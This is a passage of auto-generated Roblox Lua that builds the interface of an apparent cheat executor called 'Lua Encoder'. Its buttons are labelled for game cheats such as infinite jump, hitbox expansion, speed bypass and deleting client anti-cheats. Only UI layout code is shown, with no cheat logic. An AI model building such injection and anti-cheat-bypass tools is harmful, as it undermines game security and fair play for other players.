G2L["95"]["Text"] = [[Already Injected to roblox]];
G2L["95"]["Name"] = [[Desc]];
G2L["95"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.AlrInjcFrame.ImageLabel
G2L["96"] = Instance.new("ImageLabel", G2L["91"]);
G2L["96"]["ZIndex"] = 999999999;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["Image"] = [[rbxassetid://17546664635]];
G2L["96"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.AlrInjcFrame.UIStroke
G2L["97"] = Instance.new("UIStroke", G2L["91"]);


-- StarterGui.LuaEncoderPC.ExecutedFrame
G2L["98"] = Instance.new("Frame", G2L["1"]);
G2L["98"]["Visible"] = false;
G2L["98"]["ZIndex"] = 999999999;
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["98"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["98"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["Name"] = [[ExecutedFrame]];

-- StarterGui.LuaEncoderPC.ExecutedFrame.UICorner
G2L["99"] = Instance.new("UICorner", G2L["98"]);


-- StarterGui.LuaEncoderPC.ExecutedFrame.LocalScript
G2L["9a"] = Instance.new("LocalScript", G2L["98"]);


-- StarterGui.LuaEncoderPC.ExecutedFrame.Title
G2L["9b"] = Instance.new("TextLabel", G2L["98"]);
G2L["9b"]["ZIndex"] = 999999999;
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["TextSize"] = 14;
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["BackgroundTransparency"] = 1;
G2L["9b"]["Size"] = UDim2.new(0, 70, 0, 29);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Text"] = [[Lua Encoder]];
G2L["9b"]["Name"] = [[Title]];
G2L["9b"]["Position"] = UDim2.new(0.05245, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ExecutedFrame.Desc
G2L["9c"] = Instance.new("TextLabel", G2L["98"]);
G2L["9c"]["ZIndex"] = 999999999;
G2L["9c"]["BorderSizePixel"] = 0;
G2L["9c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["TextSize"] = 14;
G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["BackgroundTransparency"] = 1;
G2L["9c"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9c"]["Text"] = [[Executed Code]];
G2L["9c"]["Name"] = [[Desc]];
G2L["9c"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.ExecutedFrame.ImageLabel
G2L["9d"] = Instance.new("ImageLabel", G2L["98"]);
G2L["9d"]["ZIndex"] = 999999999;
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["Image"] = [[rbxassetid://17546664635]];
G2L["9d"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["BackgroundTransparency"] = 1;
G2L["9d"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ExecutedFrame.UIStroke
G2L["9e"] = Instance.new("UIStroke", G2L["98"]);


-- StarterGui.LuaEncoderPC.ClearedFrame
G2L["9f"] = Instance.new("Frame", G2L["1"]);
G2L["9f"]["Visible"] = false;
G2L["9f"]["ZIndex"] = 999999999;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["9f"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["9f"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Name"] = [[ClearedFrame]];

-- StarterGui.LuaEncoderPC.ClearedFrame.UICorner
G2L["a0"] = Instance.new("UICorner", G2L["9f"]);


-- StarterGui.LuaEncoderPC.ClearedFrame.LocalScript
G2L["a1"] = Instance.new("LocalScript", G2L["9f"]);


-- StarterGui.LuaEncoderPC.ClearedFrame.Title
G2L["a2"] = Instance.new("TextLabel", G2L["9f"]);
G2L["a2"]["ZIndex"] = 999999999;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["TextSize"] = 14;
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["BackgroundTransparency"] = 1;
G2L["a2"]["Size"] = UDim2.new(0, 73, 0, 29);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Text"] = [[Lua Encoder]];
G2L["a2"]["Name"] = [[Title]];
G2L["a2"]["Position"] = UDim2.new(0.04118, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ClearedFrame.ImageLabel
G2L["a3"] = Instance.new("ImageLabel", G2L["9f"]);
G2L["a3"]["ZIndex"] = 999999999;
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["Image"] = [[rbxassetid://17546664635]];
G2L["a3"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["BackgroundTransparency"] = 1;
G2L["a3"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ClearedFrame.UIStroke
G2L["a4"] = Instance.new("UIStroke", G2L["9f"]);


-- StarterGui.LuaEncoderPC.ClearedFrame.Desc
G2L["a5"] = Instance.new("TextLabel", G2L["9f"]);
G2L["a5"]["ZIndex"] = 999999999;
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a5"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["TextSize"] = 14;
G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["BackgroundTransparency"] = 1;
G2L["a5"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["Text"] = [[Cleared CodeBox]];
G2L["a5"]["Name"] = [[Desc]];
G2L["a5"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.ExecutedThing
G2L["a6"] = Instance.new("Frame", G2L["1"]);
G2L["a6"]["Visible"] = false;
G2L["a6"]["ZIndex"] = 999999999;
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["a6"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["a6"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["Name"] = [[ExecutedThing]];

-- StarterGui.LuaEncoderPC.ExecutedThing.UICorner
G2L["a7"] = Instance.new("UICorner", G2L["a6"]);


-- StarterGui.LuaEncoderPC.ExecutedThing.LocalScript
G2L["a8"] = Instance.new("LocalScript", G2L["a6"]);


-- StarterGui.LuaEncoderPC.ExecutedThing.Title
G2L["a9"] = Instance.new("TextLabel", G2L["a6"]);
G2L["a9"]["ZIndex"] = 999999999;
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["TextSize"] = 14;
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["BackgroundTransparency"] = 1;
G2L["a9"]["Size"] = UDim2.new(0, 71, 0, 29);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[Lua Encoder]];
G2L["a9"]["Name"] = [[Title]];
G2L["a9"]["Position"] = UDim2.new(0.04869, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ExecutedThing.Desc
G2L["aa"] = Instance.new("TextLabel", G2L["a6"]);
G2L["aa"]["ZIndex"] = 999999999;
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["aa"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["TextSize"] = 14;
G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["BackgroundTransparency"] = 1;
G2L["aa"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["Text"] = [[Executed]];
G2L["aa"]["Name"] = [[Desc]];
G2L["aa"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.ExecutedThing.ImageLabel
G2L["ab"] = Instance.new("ImageLabel", G2L["a6"]);
G2L["ab"]["ZIndex"] = 999999999;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["Image"] = [[rbxassetid://17546664635]];
G2L["ab"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["BackgroundTransparency"] = 1;
G2L["ab"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.ExecutedThing.UIStroke
G2L["ac"] = Instance.new("UIStroke", G2L["a6"]);


-- StarterGui.LuaEncoderPC.Panel
G2L["ad"] = Instance.new("Frame", G2L["1"]);
G2L["ad"]["Visible"] = false;
G2L["ad"]["ZIndex"] = 999999999;
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["ad"]["Size"] = UDim2.new(0.39236, 0, 0.6025, 0);
G2L["ad"]["Position"] = UDim2.new(0.49483, 0, 0.15074, 0);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Name"] = [[Panel]];

-- StarterGui.LuaEncoderPC.Panel.Title
G2L["ae"] = Instance.new("TextLabel", G2L["ad"]);
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["TextSize"] = 14;
G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ae"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
G2L["ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["Text"] = [[Owner Panel]];
G2L["ae"]["Name"] = [[Title]];
G2L["ae"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.Panel.Title.UICorner
G2L["af"] = Instance.new("UICorner", G2L["ae"]);


-- StarterGui.LuaEncoderPC.Panel.Title.UIStroke
G2L["b0"] = Instance.new("UIStroke", G2L["ae"]);
G2L["b0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Panel.Ghost
G2L["b1"] = Instance.new("TextButton", G2L["ad"]);
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["TextSize"] = 14;
G2L["b1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b1"]["ZIndex"] = 999999999;
G2L["b1"]["Size"] = UDim2.new(0.36277, 0, 0.1151, 0);
G2L["b1"]["Name"] = [[Ghost]];
G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["Text"] = [[Gravity Changer]];
G2L["b1"]["Position"] = UDim2.new(0.0652, 0, 0.17788, 0);

-- StarterGui.LuaEncoderPC.Panel.Ghost.UIStroke
G2L["b2"] = Instance.new("UIStroke", G2L["b1"]);
G2L["b2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b2"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.Ghost.UICorner
G2L["b3"] = Instance.new("UICorner", G2L["b1"]);


-- StarterGui.LuaEncoderPC.Panel.OwnerMain
G2L["b4"] = Instance.new("LocalScript", G2L["ad"]);
G2L["b4"]["Name"] = [[OwnerMain]];

-- StarterGui.LuaEncoderPC.Panel.UICorner
G2L["b5"] = Instance.new("UICorner", G2L["ad"]);


-- StarterGui.LuaEncoderPC.Panel.UIStroke
G2L["b6"] = Instance.new("UIStroke", G2L["ad"]);
G2L["b6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Panel.DLT
G2L["b7"] = Instance.new("TextButton", G2L["ad"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["ZIndex"] = 999999999;
G2L["b7"]["Size"] = UDim2.new(0.36277, 0, 0.12093, 0);
G2L["b7"]["Name"] = [[DLT]];
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Text"] = [[Infinite jump]];
G2L["b7"]["Position"] = UDim2.new(0.0652, 0, 0.29298, 0);

-- StarterGui.LuaEncoderPC.Panel.DLT.UIStroke
G2L["b8"] = Instance.new("UIStroke", G2L["b7"]);
G2L["b8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b8"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.DLT.UICorner
G2L["b9"] = Instance.new("UICorner", G2L["b7"]);


-- StarterGui.LuaEncoderPC.Panel.Cloud
G2L["ba"] = Instance.new("TextButton", G2L["ad"]);
G2L["ba"]["BorderSizePixel"] = 0;
G2L["ba"]["TextSize"] = 14;
G2L["ba"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ba"]["ZIndex"] = 999999999;
G2L["ba"]["Size"] = UDim2.new(0.36277, 0, 0.12872, 0);
G2L["ba"]["Name"] = [[Cloud]];
G2L["ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ba"]["Text"] = [[Hitbox Ex]];
G2L["ba"]["Position"] = UDim2.new(0.0652, 0, 0.41309, 0);

-- StarterGui.LuaEncoderPC.Panel.Cloud.UIStroke
G2L["bb"] = Instance.new("UIStroke", G2L["ba"]);
G2L["bb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["bb"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.Cloud.UICorner
G2L["bc"] = Instance.new("UICorner", G2L["ba"]);


-- StarterGui.LuaEncoderPC.Panel.fe
G2L["bd"] = Instance.new("TextButton", G2L["ad"]);
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["TextSize"] = 14;
G2L["bd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bd"]["ZIndex"] = 999999999;
G2L["bd"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["bd"]["Name"] = [[fe]];
G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["Text"] = [[Dex Explorer]];
G2L["bd"]["Position"] = UDim2.new(0.0652, 0, 0.54117, 0);

-- StarterGui.LuaEncoderPC.Panel.fe.UIStroke
G2L["be"] = Instance.new("UIStroke", G2L["bd"]);
G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["be"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.fe.UICorner
G2L["bf"] = Instance.new("UICorner", G2L["bd"]);


-- StarterGui.LuaEncoderPC.Panel.fel
G2L["c0"] = Instance.new("TextButton", G2L["ad"]);
G2L["c0"]["BorderSizePixel"] = 0;
G2L["c0"]["TextSize"] = 14;
G2L["c0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c0"]["ZIndex"] = 999999999;
G2L["c0"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["c0"]["Name"] = [[fel]];
G2L["c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["Text"] = [[show hitbox]];
G2L["c0"]["Visible"] = false;
G2L["c0"]["Position"] = UDim2.new(0.0652, 0, 0.68137, 0);

-- StarterGui.LuaEncoderPC.Panel.fel.UIStroke
G2L["c1"] = Instance.new("UIStroke", G2L["c0"]);
G2L["c1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c1"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.fel.UICorner
G2L["c2"] = Instance.new("UICorner", G2L["c0"]);


-- StarterGui.LuaEncoderPC.Panel.kck
G2L["c3"] = Instance.new("TextButton", G2L["ad"]);
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["TextSize"] = 14;
G2L["c3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c3"]["ZIndex"] = 999999999;
G2L["c3"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["c3"]["Name"] = [[kck]];
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Text"] = [[Security Kick]];
G2L["c3"]["Position"] = UDim2.new(0.0652, 0, 0.68137, 0);

-- StarterGui.LuaEncoderPC.Panel.kck.UIStroke
G2L["c4"] = Instance.new("UIStroke", G2L["c3"]);
G2L["c4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c4"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.kck.UICorner
G2L["c5"] = Instance.new("UICorner", G2L["c3"]);


-- StarterGui.LuaEncoderPC.Panel.blade1
G2L["c6"] = Instance.new("TextButton", G2L["ad"]);
G2L["c6"]["BorderSizePixel"] = 0;
G2L["c6"]["TextSize"] = 14;
G2L["c6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c6"]["ZIndex"] = 999999999;
G2L["c6"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["c6"]["Name"] = [[blade1]];
G2L["c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["Text"] = [[Blade ball v2]];
G2L["c6"]["Position"] = UDim2.new(0.57227, 0, 0.17745, 0);

-- StarterGui.LuaEncoderPC.Panel.blade1.UIStroke
G2L["c7"] = Instance.new("UIStroke", G2L["c6"]);
G2L["c7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c7"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.blade1.UICorner
G2L["c8"] = Instance.new("UICorner", G2L["c6"]);


-- StarterGui.LuaEncoderPC.Panel.blade2
G2L["c9"] = Instance.new("TextButton", G2L["ad"]);
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["TextSize"] = 14;
G2L["c9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c9"]["ZIndex"] = 999999999;
G2L["c9"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["c9"]["Name"] = [[blade2]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Text"] = [[Blade ball v3]];
G2L["c9"]["Position"] = UDim2.new(0.57227, 0, 0.31841, 0);

-- StarterGui.LuaEncoderPC.Panel.blade2.UIStroke
G2L["ca"] = Instance.new("UIStroke", G2L["c9"]);
G2L["ca"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ca"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.blade2.UICorner
G2L["cb"] = Instance.new("UICorner", G2L["c9"]);


-- StarterGui.LuaEncoderPC.Panel.blade3
G2L["cc"] = Instance.new("TextButton", G2L["ad"]);
G2L["cc"]["TextWrapped"] = true;
G2L["cc"]["BorderSizePixel"] = 0;
G2L["cc"]["TextSize"] = 14;
G2L["cc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cc"]["ZIndex"] = 999999999;
G2L["cc"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["cc"]["Name"] = [[blade3]];
G2L["cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["Text"] = [[Blade ball v4 (not working)]];
G2L["cc"]["Position"] = UDim2.new(0.57227, 0, 0.45937, 0);

-- StarterGui.LuaEncoderPC.Panel.blade3.UIStroke
G2L["cd"] = Instance.new("UIStroke", G2L["cc"]);
G2L["cd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["cd"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.blade3.UICorner
G2L["ce"] = Instance.new("UICorner", G2L["cc"]);


-- StarterGui.LuaEncoderPC.Panel.perigo
G2L["cf"] = Instance.new("TextButton", G2L["ad"]);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextSize"] = 14;
G2L["cf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cf"]["ZIndex"] = 999999999;
G2L["cf"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["cf"]["Name"] = [[perigo]];
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[Delete all client anti cheats (DANGEROUS]];
G2L["cf"]["Position"] = UDim2.new(0.57227, 0, 0.60032, 0);

-- StarterGui.LuaEncoderPC.Panel.perigo.UIStroke
G2L["d0"] = Instance.new("UIStroke", G2L["cf"]);
G2L["d0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d0"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.perigo.UICorner
G2L["d1"] = Instance.new("UICorner", G2L["cf"]);


-- StarterGui.LuaEncoderPC.Panel.speed
G2L["d2"] = Instance.new("TextButton", G2L["ad"]);
G2L["d2"]["TextWrapped"] = true;
G2L["d2"]["BorderSizePixel"] = 0;
G2L["d2"]["TextSize"] = 14;
G2L["d2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d2"]["ZIndex"] = 999999999;
G2L["d2"]["Size"] = UDim2.new(0.36277, 0, 0.14097, 0);
G2L["d2"]["Name"] = [[speed]];
G2L["d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["Text"] = [[Speed (Bypass)]];
G2L["d2"]["Position"] = UDim2.new(0.57227, 0, 0.73835, 0);

-- StarterGui.LuaEncoderPC.Panel.speed.UIStroke
G2L["d3"] = Instance.new("UIStroke", G2L["d2"]);
G2L["d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d3"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Panel.speed.UICorner
G2L["d4"] = Instance.new("UICorner", G2L["d2"]);


-- StarterGui.LuaEncoderPC.ownerpanel
G2L["d5"] = Instance.new("TextButton", G2L["1"]);
G2L["d5"]["TextWrapped"] = true;
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["TextSize"] = 14;
G2L["d5"]["TextColor3"] = Color3.fromRGB(58, 255, 239);
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(108, 41, 135);
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d5"]["ZIndex"] = 999999999;
G2L["d5"]["Size"] = UDim2.new(0.06753, 0, 0.08596, 0);
G2L["d5"]["Name"] = [[ownerpanel]];
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Text"] = [[Owner Panel]];
G2L["d5"]["Visible"] = false;
G2L["d5"]["Position"] = UDim2.new(-0.0008, 0, 0.11111, 0);

-- StarterGui.LuaEncoderPC.ownerpanel.UICorner
G2L["d6"] = Instance.new("UICorner", G2L["d5"]);


-- StarterGui.LuaEncoderPC.ownerpanel.PanelMain
G2L["d7"] = Instance.new("LocalScript", G2L["d5"]);
G2L["d7"]["Name"] = [[PanelMain]];

-- StarterGui.LuaEncoderPC.backhub
G2L["d8"] = Instance.new("Frame", G2L["1"]);
G2L["d8"]["Visible"] = false;
G2L["d8"]["ZIndex"] = 999999999;
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["d8"]["Size"] = UDim2.new(0.70642, 0, 0.59825, 0);
G2L["d8"]["Position"] = UDim2.new(0.02197, 0, 0.14225, 0);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Name"] = [[backhub]];

-- StarterGui.LuaEncoderPC.backhub.Title
G2L["d9"] = Instance.new("TextLabel", G2L["d8"]);
G2L["d9"]["BorderSizePixel"] = 0;
G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d9"]["TextSize"] = 14;
G2L["d9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d9"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
